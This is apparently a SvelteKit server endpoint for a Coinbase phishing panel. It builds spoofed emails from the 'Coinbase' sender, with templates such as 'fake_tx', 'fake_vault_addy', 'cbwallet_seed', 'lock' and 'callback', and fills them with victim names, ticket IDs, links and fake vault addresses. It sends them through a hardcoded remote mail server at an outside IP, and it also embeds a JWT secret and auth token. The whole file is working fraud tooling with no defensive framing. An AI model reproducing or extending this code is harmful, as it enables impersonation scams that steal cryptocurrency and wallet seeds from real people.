import { json } from '@sveltejs/kit';
import type { RequestEvent } from '@sveltejs/kit';
import fs from 'fs';
import path from 'path';
import jwt from 'jsonwebtoken';

const JWT_SECRET = 'J2K)2oQ={#F&%&W<~uE~}V%+,,lB0+{8e9ONL9~KXXuye(fQ7]0=~|5 V&uet|/o';

const rateLimitMap = new Map<string, number>();
const RATE_LIMIT_WINDOW = 60 * 1000;

const REQUIRED_AUTH_HEADER = 'a-very-legit-token';
const REQUIRED_AUTH_VALUE = '493942-3124512-65941-2349124-12392491-1234941-458504-2345';

export async function POST({ params, request }: RequestEvent) {
	try {
		console.log('Received request with params:', params);
		console.log('Request headers:', Object.fromEntries(request.headers));

		const body = await request.json();
		console.log('Request body:', body);

		const { username } = body;
		if (!username) {
			return json({ error: 'Username is required' }, { status: 400 });
		}

		const now = Date.now();
		const lastRequest = rateLimitMap.get(username);

		if (lastRequest && now - lastRequest < RATE_LIMIT_WINDOW) {
			console.log('Rate limit exceeded for user:', username);
			return json({ error: 'Rate limit exceeded. Please wait 1 minute.' }, { status: 429 });
		}
		rateLimitMap.set(username, now);

		const { mailtype } = params;
		console.log('Mail type:', mailtype);

		const cookies = request.headers.get('cookie');
		console.log('Received cookies:', cookies);

		if (!cookies) {
			console.log('No cookies provided');
			return json({ error: 'No authorization cookie provided' }, { status: 401 });
		}

		const authToken = cookies
			.split('; ')
			.find((row) => row.startsWith('authToken='))
			?.split('=')[1];

		if (!authToken) {
			console.log('No auth token found in cookies');
			return json({ error: 'No authorization token found in cookies' }, { status: 401 });
		}

		try {
			jwt.verify(authToken, JWT_SECRET);
			console.log('JWT verification successful');
		} catch (err) {
			console.error('JWT verification failed:', err);
			return json({ error: 'Invalid or expired authorization token' }, { status: 401 });
		}

		const {
			email,
			vic_name,
			emp_f,
			emp_l,
			vic_f,
			vic_l,
			ticket_id,
			emp_name,
			callback_date,
			coin,
			amount,
			location,
			cb_id,
			link,
			asset,
			address
		} = body;

		const sender = 'Coinbase';
		const spoofed_domain = 'no-reply@coinbase';
		const reply_to = 'no-reply@coinbase.com';

		let mailData: any = {
			username,
			sender,
			spoofed_domain,
			reply_to,
			email,
			type: params.mailtype
		};

		console.log('Initial mail data:', mailData);

		switch (params.mailtype) {
			case 'emp':
				if (!emp_f || !emp_l || !vic_f || !vic_l || !ticket_id || !email) {
					console.log('Missing required fields for emp type:', {
						emp_f,
						emp_l,
						vic_f,
						vic_l,
						ticket_id,
						email
					});
					return json(
						{ error: 'Missing required fields for employee verification' },
						{ status: 400 }
					);
				}
				mailData = {
					...mailData,
					emp_f,
					emp_l,
					vic_f,
					vic_l,
					ticket_id
				};
				break;

			case 'cbwallet_seed':
				mailData = {
					...mailData
				};
				break;

			case 'lock':
				if (!email || !vic_name) {
					console.log('Missing required fields for lock type:', { email, vic_name });
					return json(
						{ error: 'Missing required fields for account lock notification' },
						{ status: 400 }
					);
				}
				mailData = {
					...mailData,
					email,
					vic_name
				};
				break;

			case 'fake_tx':
				if (!email || !coin || !amount) {
					console.log('Missing required fields for fake_tx type:', { email, coin, amount });
					return json(
						{ error: 'Missing required fields for fake transaction alert' },
						{ status: 400 }
					);
				}
				mailData = {
					...mailData,
					email,
					coin,
					amount
				};
				break;

			case 'callback':
				if (!email || !emp_name || !vic_name || !ticket_id || !callback_date) {
					console.log('Missing required fields for callback type:', {
						email,
						emp_name,
						vic_name,
						ticket_id,
						callback_date
					});
					return json(
						{ error: 'Missing required fields for callback notification' },
						{ status: 400 }
					);
				}
				mailData = {
					...mailData,
					email,
					emp_name,
					vic_name,
					ticket_id,
					callback_date
				};
				break;

			case 'device_conf':
				if (!email || !vic_name || !location) {
					console.log('Missing required fields for device_conf type:', {
						email,
						vic_name,
						location
					});
					return json(
						{ error: 'Missing required fields for device configuration notification' },
						{ status: 400 }
					);
				}
				mailData = {
					...mailData,
					email,
					vic_name,
					location
				};
				break;

			case 'wallet':
				if (!email || !cb_id || !link) {
					console.log('Missing required fields for wallet type:', { email, cb_id, link });
					return json(
						{ error: 'Missing required fields for wallet setup notification' },
						{ status: 400 }
					);
				}
				mailData = {
					...mailData,
					email,
					cb_id,
					link
				};
				break;

			case 'fake_vault_addy':
				if (!email || !asset || !address || !cb_id) {
					console.log('Missing required fields for fake_vault_addy type:', {
						email,
						asset,
						address,
						cb_id
					});
					return json(
						{ error: 'Missing required fields for fake vault address notification' },
						{ status: 400 }
					);
				}
				mailData = {
					...mailData,
					email,
					asset,
					address,
					cb_id
				};
				break;

			case 'panel':
				if (!email || !cb_id) {
					console.log('Missing required fields for panel type:', { email, cb_id });
					return json({ error: 'Missing required fields for panel notification' }, { status: 400 });
				}
				mailData = {
					...mailData,
					email,
					link,
					cb_id
				};
				break;

			case 'ticket':
				if (!email || !cb_id || !link) {
					console.log('Missing required fields for ticket type:', { email, cb_id, link });
					return json(
						{ error: 'Missing required fields for support ticket notification' },
						{ status: 400 }
					);
				}
				mailData = {
					...mailData,
					email,
					cb_id,
					link
				};
				break;

			case 'vault':
				if (!email || !cb_id || !link) {
					console.log('Missing required fields for vault type:', { email, cb_id, link });
					return json(
						{ error: 'Missing required fields for vault setup notification' },
						{ status: 400 }
					);
				}
				mailData = {
					...mailData,
					email,
					cb_id,
					link
				};
				break;

			default:
				console.log('Invalid mail type:', params.mailtype);
				return json({ error: 'Invalid mail type' }, { status: 400 });
		}

		console.log('Final mail data before sending:', mailData);
		console.log('Attempting to send mail to:', 'http://178.20.43.232:3000/send_mail');

		const mailServerResponse = await fetch('http://178.20.43.232:3000/send_mail', {
			method: 'POST',
			headers: {
				'Content-Type': 'application/json',
				[REQUIRED_AUTH_HEADER]: REQUIRED_AUTH_VALUE
			},
			body: JSON.stringify(mailData)
		});

		console.log('Mail server response status:', mailServerResponse.status);
		console.log('Mail server response headers:', Object.fromEntries(mailServerResponse.headers));

		if (!mailServerResponse.ok) {
			const errorText = await mailServerResponse.text();
			console.error('Mail server error response:', errorText);
			throw new Error(
				`Mail server responded with status: ${mailServerResponse.status}. Response: ${errorText}`
			);
		}

		const responseData = await mailServerResponse.json();
		console.log('Successful response data:', responseData);
		return json(responseData);
	} catch (error) {
		console.error('Detailed error in mail endpoint:', {
			error: error instanceof Error ? error.message : error,
			stack: error instanceof Error ? error.stack : undefined
		});
		return json({ error: 'Internal server error' }, { status: 500 });
	}
}
